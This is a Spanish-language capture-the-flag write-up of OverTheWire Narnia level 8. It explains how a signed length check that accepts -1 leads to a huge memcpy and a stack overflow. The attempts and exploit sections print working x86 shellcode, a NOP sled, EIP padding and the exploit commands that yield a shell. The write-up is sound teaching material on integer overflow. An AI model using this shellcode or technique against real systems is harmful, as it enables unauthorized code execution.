*[Image: banner]*

```bash
$ ssh narnia8@narnia.labs.overthewire.org -p 2226

$ echo $TARGET
> un candado con lógica correcta · un número con contexto incorrecto · cuatro mil millones de bytes de error

$ echo $VECTOR
> integer overflow · signed/unsigned mismatch · bypass de validación · corrupción de memoria derivada
```

---

## `> [RECON]`

```bash
$ cat /narnia/narnia8.c
```

```c
int length;
length = atoi(argv[1]);
if(length > 256){
    printf("Too long!\n");
    exit(1);
}
memcpy(buffer, argv[2], length);
```

El candado existe.
La lógica es correcta.
El tipo de dato no.

`length` es un `int`: entero con signo.
La validación `length > 256` funciona perfectamente
para cualquier número positivo mayor a 256.

Para `-1`, la validación dice que pasa.
`-1 < 256`. Correcto. Matemáticamente impecable.

Lo que pasa después es otra conversación.

---

## `> [HYPOTHESIS]`

```diff
+ length es int con signo. -1 pasa el filtro porque -1 < 256.
+ memcpy recibe size_t: entero sin signo.
+ -1 como signed int → 0xFFFFFFFF como size_t → 4,294,967,295 bytes a copiar.
+ el candado se desintegra en la transición entre tipos.
+ con el tamaño correcto en argv[2] controlamos el overflow y llegamos al EIP.
- mandé 300 esperando que el programa no saliera. Too long!. el filtro funciona.
- no vi la diferencia entre la comparación con signo y la copia sin signo.
  el mismo número. dos interpretaciones. dos resultados distintos.
```

---

## `> [ATTEMPTS]`

<details>
<summary><code>// 3l c4nd4d0 l3y0 b13n. l4 c3rr4dur4 n0.</code></summary>

```bash
#: intento 1
$ /narnia/narnia8 300 AAAA
# Too long!
# el filtro funciona. 300 > 256. el programa sale.

#: intento 2
$ /narnia/narnia8 -1 AAAA
# Segmentation fault
# pasamos la validación. -1 < 256: el IF no bloquea.
# memcpy intentó copiar 0xFFFFFFFF bytes. el proceso colapsó antes de llegar a main.
# el crash está. pero no es control. ya sabemos la diferencia.

#: intento 3
# necesitamos un tamaño negativo que pase el filtro
# pero que en la copia produzca exactamente el overflow que necesitamos.
# el offset hasta EIP se mide con cyclic en GDB como siempre.
gdb$ run -1 $(python3 -c 'from pwn import *; print(cyclic(300).decode())')
gdb$ info registers eip
# offset medido. distancia exacta hasta EIP.

#: intento 4: ahí.
# shellcode en variable de entorno. NOP sled. dirección obtenida con programa auxiliar.
$ export PAYLOAD=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
$ /narnia/narnia8 -1 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*OFFSET + b"\xa0\xd9\xff\xff")')
```

```txt
filtro: evadido.
memcpy: desbordado.
shell: narnia9.
```

</details>

---

## `> [BREAK]`

La paradoja del tipo de dato:

```
  argv[1] = "-1"
       ↓
  length = atoi("-1") = -1

  if(length > 256)     →   -1 > 256   →   FALSO   →   pasa el filtro
       ↓
  memcpy(buffer, argv[2], length)
       ↓
  size_t(-1) = 0xFFFFFFFF = 4,294,967,295 bytes
```

El mismo número. Dos contextos. Dos resultados.

En 1999, el mundo entró en pánico por algo parecido.
No por un overflow: por una suposición implícita sobre el rango válido de un número.
Los programadores de los años 60 guardaban el año en dos dígitos.
`99` en vez de `1999`. Eficiente. Razonable para su época.
Nadie documentó qué pasaría cuando llegara `00`.

Y2K no fue un mito urbano.
Fue la primera vez que el mundo entendió masivamente
que los números tienen contexto
y que ese contexto puede ser una vulnerabilidad.

Se gastaron 600 mil millones de dólares
para que el 1 de enero de 2000 no pasara nada.
Eso no significa que no había problema.
Significa que alguien lo resolvió antes de que lo vieras.

En Narnia 8 nadie lo resolvió.
`int` sigue siendo `int`. `size_t` sigue siendo `size_t`.
El candado sigue leyendo bien.
La cerradura sigue interpretando mal.

> *→ [`/lore/y2k.md`](../lore/y2k.md)*

---

## `> [EXPLOIT]`

```bash
export PAYLOAD=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
/narnia/narnia8 -1 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*OFFSET + b"\xa0\xd9\xff\xff")')
```

```
-1               → pasa el filtro. -1 < 256. matemáticamente correcto.
                   contextualmente catastrófico.
size_t(-1)       → 0xFFFFFFFF. cuatro mil millones de bytes.
                   memcpy no pregunta. copia.
b"A"*OFFSET      → relleno exacto hasta EIP. medido, no adivinado.
PAYLOAD          → shellcode en entorno. fuera del buffer. dirección estable.
```

---

## `> [FLAG]`

```
[REDACTED]
```

> n0 m3 l4 d1g4s. n0 m3 1nt3r3s4.
> 3l pr3m10 n0 3s un str1ng d3 t3xt0.

---

## `> [REFLECTION]`

```diff
+ int con signo vs size_t sin signo: el mismo valor. dos interpretaciones. una vulnerabilidad.
+ el filtro era correcto. el tipo de dato no. no es lo mismo.
+ -1 como tamaño no produce un overflow pequeño. produce el overflow más grande posible.
+ la suposición implícita sobre el rango válido de un dato es tan peligrosa como no validar.
- 300 > 256 → Too long!. el filtro funciona para lo que el programador pensó.
- -1 como size_t → 0xFFFFFFFF. nadie pensó en eso. ese es el problema.
```

---

## `> echo $CHALLENGE`

El programador validó la entrada.
La lógica era correcta.
El número pasó igual.

Y2K casi costó el colapso de infraestructura global
por una suposición que nadie documentó en los años 60.
Dos dígitos para el año. Razonable en 1965.
Catastrófico en 1999.

Busca **CWE-190: Integer Overflow or Wraparound**.
Busca cuántas vulnerabilidades críticas en los últimos diez años
tienen ese identificador en su raíz.
Busca **CVE-2021-3156**: sudo, 2021.
Un integer overflow en un programa que corre en casi todos los sistemas Unix del mundo.

El que lo encuentra entiende que este error
no quedó en los años 90.
Lleva décadas viajando de sistema en sistema
dentro de código que nadie revisó
porque parecía correcto.

---

```
█████████████████████████████████████████████
█                                           █
█   3l c4nd4d0 l3y0 b13n.                 █
█         l4 c3rr4dur4 n0 l0 v10.         █
█                                           █
█████████████████████████████████████████████
```

> *→[https://youtube.com/t474-r0b07](https://youtube.com/@kaderd.garnica?si=9vk1E6Gkkb7LftTK)*
---

> *→ anterior: [narnia7](narnia07.md)**→ siguiente: [narnia9](narnia09.md)*

> > 🔴 **EL RASTRO CONTINÚA**
>
> Los números tienen contexto. El contexto está más abajo.
>
> 🧭 **[ÍNDICE DEL LORE](https://github.com/t474-r0b07/ctf-writeups/tree/main/lore)**

---
<!-- 0x59 0x32 0x4b // 3l pr0bl3m4 n0 3r4 3l núm3r0. 3r4 l0 qu3 s1gn1f1c4b4. -->
